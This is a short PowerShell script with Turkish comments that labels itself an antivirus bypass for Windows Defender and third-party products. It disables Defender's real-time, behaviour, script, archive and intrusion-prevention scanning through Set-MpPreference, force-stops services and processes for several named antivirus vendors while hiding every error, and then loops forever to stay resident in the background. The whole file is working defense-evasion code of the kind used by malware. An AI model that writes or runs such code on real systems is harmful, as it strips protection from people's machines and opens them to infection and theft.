# ============================================================
# ANTİVİRÜS BYPASS (Windows Defender + 3. Parti)
# ============================================================
try {
    # Windows Defender'ı devre dışı bırak
    $commands = @(
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true",
        "Set-MpPreference -DisableIOAVProtection $true",
        "Set-MpPreference -DisablePrivacyMode $true",
        "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
        "Set-MpPreference -DisableArchiveScanning $true",
        "Set-MpPreference -DisableIntrusionPreventionSystem $true",
        "Set-MpPreference -DisableScriptScanning $true",
        "Set-MpPreference -SubmitSamplesConsent 2"
    )
    foreach ($cmd in $commands) {
        try { Invoke-Expression $cmd -ErrorAction SilentlyContinue } catch {}
    }

    # Antivirüs servislerini durdur
    $services = @("WinDefend", "MsMpSvc", "McAfee", "Norton", "Avast", "Kaspersky", "Bitdefender")
    foreach ($svc in $services) {
        try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } catch {}
        try { Stop-Process -Name $svc -Force -ErrorAction SilentlyContinue } catch {}
    }

    Write-Host "Antivirusler devre disi birakildi." -ForegroundColor Green
} catch {
    Write-Host "Antivirus bypass hatasi: $_" -ForegroundColor Yellow
}

# Sonsuz bekle (arka planda kalsın)
while ($true) { Start-Sleep -Seconds 10 }